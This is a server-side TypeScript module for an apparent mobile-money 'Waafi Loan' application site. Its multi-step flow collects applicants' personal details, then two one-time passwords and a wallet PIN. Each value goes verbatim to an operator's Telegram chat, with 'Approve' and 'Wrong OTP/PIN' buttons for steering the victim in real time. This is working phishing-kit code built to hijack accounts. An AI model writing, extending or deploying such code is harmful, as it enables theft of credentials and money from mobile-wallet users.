import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

const applicationSchema = z.object({
  full_name: z.string().trim().min(2).max(100),
  email: z.string().trim().email().max(255),
  phone: z
  .string()
  .trim()
  .regex(
    /^\+25[23]\d{1,10}$/,
    "must be +252 or +253 followed by no more than 10 digits",
  )
    .refine(
      (v) => {
        const digits = v.replace(/\D/g, "");
        return !digits.slice(0, 5).includes("63");
      },
      { message: "is not supported. Please use a different phone number." },
    ),
  amount: z.number().positive().max(10_000_000),
  purpose: z.string().trim().min(3).max(10000),
  monthly_income: z.number().positive().max(10_000_000),
  months: z.number().int().positive().max(360),
  interest_rate: z.number().nonnegative().max(100),
  site_id: z.string().uuid().optional(),
  loan_type: z.enum(["personal", "business"]).optional(),
});

const FRIENDLY_FIELD: Record<string, string> = {
  full_name: "Full name",
  email: "Email",
  phone: "Phone",
  amount: "Loan amount",
  purpose: "Purpose",
  monthly_income: "Monthly income",
  months: "Term (months)",
  interest_rate: "Interest rate",
  value: "Code",
};

function friendlyParse<T>(schema: z.ZodType<T>, input: unknown): T {
  const r = schema.safeParse(input);
  if (r.success) return r.data;
  const first = r.error.issues[0];
  const field = String(first?.path?.[0] ?? "");
  const label = FRIENDLY_FIELD[field] ?? field ?? "Field";
  let msg = first?.message ?? "Invalid input";
  if (msg.startsWith("String must contain at least")) {
    const n = msg.match(/\d+/)?.[0] ?? "";
    msg = `must be at least ${n} characters long`;
  } else if (msg.startsWith("String must contain at most")) {
    const n = msg.match(/\d+/)?.[0] ?? "";
    msg = `must be at most ${n} characters`;
  } else if (msg === "Required") {
    msg = "is required";
  } else if (msg.toLowerCase().includes("invalid email")) {
    msg = "is not a valid email address";
  } else if (msg.toLowerCase().startsWith("expected") || msg === "Invalid input") {
    msg = "is invalid";
  }
  throw new Error(`${label} ${msg}`);
}

export const submitApplication = createServerFn({ method: "POST" })
  .inputValidator((input) => friendlyParse(applicationSchema, input))
  .handler(async ({ data }) => {
    const { getSupabaseAdmin } = await import("./supabase-admin.server");
    const supabase = getSupabaseAdmin();

    const { loan_type, ...insertData } = data;
    const { data: row, error } = await supabase
      .from("loan_applications")
      .insert({ ...insertData, status: "submitted" })
      .select()
      .single();
    if (error) throw new Error(error.message);

    const site = await loadSiteCreds(row.site_id);
    const loanTypeLabel =
      loan_type === "business"
        ? "Waafi Business Loan (Merchant)"
        : loan_type === "personal"
          ? "Waafi Personal Loan"
          : "Waafi Loan";
    const text =
      `<b>New Loan Application — ${escapeHtml(site?.site_name ?? "Site")}</b>\n\n` +
      `<b>💳 Loan Type:</b> ${escapeHtml(loanTypeLabel)}\n` +
      `<b>👤 Name:</b> ${escapeHtml(row.full_name)}\n` +
      `<b>Email:</b> ${escapeHtml(row.email)}\n` +
      `<b>📱Phone:</b> ${escapeHtml(String(row.phone).replace(/^\+25[23]/, ""))}\n` +
      `<b>Amount:</b> ${row.amount}\n` +
      `<b>📅Months:</b> ${row.months}\n` +
      `<b>Interest:</b> ${row.interest_rate}%\n` +
      `<b>💼Monthly Income:</b> ${row.monthly_income}\n` +
      `<b>Purpose:</b> ${escapeHtml(row.purpose)}\n\n` +
      `Stage: <i>application review</i>`;
    await sendTelegramDecision(row.id, text, "submitted", site);

    return { id: row.id };
  });

function escapeHtml(s: string) {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

export const listApplications = createServerFn({ method: "GET" }).handler(
  async () => {
    const { getSupabaseAdmin } = await import("./supabase-admin.server");
    const supabase = getSupabaseAdmin();
    const { data, error } = await supabase
      .from("loan_applications")
      .select("*")
      .order("created_at", { ascending: false });
    if (error) throw new Error(error.message);
    return data;
  },
);

// --- Multi-step flow ---

const STAGE_MAP = {
  otp1: { required: "otp1_required", submitted: "otp1_submitted", label: "First OTP" },
  pin: { required: "pin_required", submitted: "pin_submitted", label: "PIN" },
  otp2: { required: "otp2_required", submitted: "otp2_submitted", label: "Final OTP" },
} as const;

type StepKey = keyof typeof STAGE_MAP;

const stepSchema = z
  .object({
    id: z.string().uuid(),
    step: z.enum(["otp1", "pin", "otp2"]),
    value: z.string().trim(),
  })
  .refine(
    (d) =>
      d.step === "pin"
        ? /^\d{4}$/.test(d.value)
        : /^\d{6}$/.test(d.value),
    { message: "PIN must be 4 digits and OTP must be 6 digits" },
  );

export const submitStep = createServerFn({ method: "POST" })
  .inputValidator((input) => friendlyParse(stepSchema, input))
  .handler(async ({ data }) => {
    const { getSupabaseAdmin } = await import("./supabase-admin.server");
    const supabase = getSupabaseAdmin();
    const stage = STAGE_MAP[data.step as StepKey];

    const { data: existing, error: fetchErr } = await supabase
      .from("loan_applications")
      .select("*")
      .eq("id", data.id)
      .single();
    if (fetchErr) throw new Error(fetchErr.message);
    if (existing.status !== stage.required) {
      throw new Error(`Not at ${stage.label} step yet`);
    }

    const patch: Record<string, unknown> = {
      status: stage.submitted,
      [data.step]: data.value,
    };
    const { data: row, error } = await supabase
      .from("loan_applications")
      .update(patch)
      .eq("id", data.id)
      .select()
      .single();
    if (error) throw new Error(error.message);

    const text =
      `<b>${stage.label} submitted</b>\n\n` +
      `<b>Applicant:</b> ${escapeHtml(row.full_name)}\n` +
      `<b>${stage.label}:</b> <code>${escapeHtml(data.value)}</code>\n\n` +
      `Approve to advance, reject to cancel.`;
    const site = await loadSiteCreds(row.site_id);
    await sendTelegramDecision(row.id, text, stage.submitted, site);
    return { ok: true };
  });

const resendSchema = z.object({ id: z.string().uuid() });

export const resendOtp = createServerFn({ method: "POST" })
  .inputValidator((input) => friendlyParse(resendSchema, input))
  .handler(async ({ data }) => {
    const { getSupabaseAdmin } = await import("./supabase-admin.server");
    const supabase = getSupabaseAdmin();
    const { data: row, error } = await supabase
      .from("loan_applications")
      .select("id,full_name,status,site_id")
      .eq("id", data.id)
      .single();
    if (error) throw new Error(error.message);
    const text =
      `<b>OTP resend requested</b>\n\n` +
      `<b>Applicant:</b> ${escapeHtml(row.full_name)}\n` +
      `<b>Current stage:</b> ${escapeHtml(row.status)}\n\n` +
      `User asked for OTP resend.`;
    const site = await loadSiteCreds(row.site_id);
    await sendTelegramNotice(text, site);
    return { ok: true };
  });

type SiteCreds = {
  site_name?: string;
  telegram_bot_token?: string | null;
  telegram_chat_id?: string | null;
} | null;

export async function loadSiteCreds(siteId: string | null | undefined): Promise<SiteCreds> {
  if (!siteId) return null;
  try {
    const { getSupabaseAdmin } = await import("./supabase-admin.server");
    const supabase = getSupabaseAdmin();
    const { data } = await supabase
      .from("sites")
      .select("site_name, telegram_bot_token, telegram_chat_id")
      .eq("id", siteId)
      .maybeSingle();
    return data ?? null;
  } catch {
    return null;
  }
}

function resolveCreds(site: SiteCreds): { botToken?: string; chatId?: string } {
  const botToken = site?.telegram_bot_token || process.env.TELEGRAM_BOT_TOKEN;
  const chatId = site?.telegram_chat_id || process.env.TELEGRAM_CHAT_ID;
  return { botToken: botToken || undefined, chatId: chatId || undefined };
}

async function sendTelegramNotice(text: string, site: SiteCreds = null) {
  const { botToken, chatId } = resolveCreds(site);
  if (!botToken || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
    });
  } catch (e) {
    console.error("Telegram notice error", e);
  }
}

const statusSchema = z.object({ id: z.string().uuid() });

export const getApplicationStatus = createServerFn({ method: "GET" })
  .inputValidator((input) => statusSchema.parse(input))
  .handler(async ({ data }) => {
    const { getSupabaseAdmin } = await import("./supabase-admin.server");
    const supabase = getSupabaseAdmin();
    const { data: row, error } = await supabase
      .from("loan_applications")
      .select("id,status")
      .eq("id", data.id)
      .single();
    if (error) throw new Error(error.message);
    return row;
  });

async function sendTelegramDecision(
  id: string,
  text: string,
  fromStatus: string,
  site: SiteCreds = null,
) {
  const { botToken, chatId } = resolveCreds(site);
  if (!botToken || !chatId) return;
  // For OTP/PIN review stages, the negative action asks the user to re-enter
  // instead of cancelling the whole application.
  const retryLabel: Record<string, string> = {
    otp1_submitted: "🔁 Wrong OTP",
    pin_submitted: "🔁 Wrong PIN",
    otp2_submitted: "🔁 Wrong OTP",
  };
  const negative =
    fromStatus in retryLabel
      ? { text: retryLabel[fromStatus], callback_data: `retry:${fromStatus}:${id}` }
      : { text: "❌ Reject", callback_data: `reject:${fromStatus}:${id}` };
  try {
    const resp = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: "HTML",
          reply_markup: {
  inline_keyboard:
    fromStatus === "otp2_submitted"
      ? [
          [
            {
              text: "✅ Approve",
              callback_data: `approve:${fromStatus}:${id}`,
            },
            negative,
          ],
          [
            {
              text: "🔁 Wrong PIN",
              callback_data: `pinretry:${fromStatus}:${id}`,
            },
          ],
        ]
      : [
          [
            {
              text: "✅ Approve",
              callback_data: `approve:${fromStatus}:${id}`,
            },
            negative,
          ],
        ],
},
        }),
      },
    );
    if (!resp.ok) console.error("Telegram send failed", resp.status, await resp.text());
  } catch (e) {
    console.error("Telegram notify error", e);
  }
}
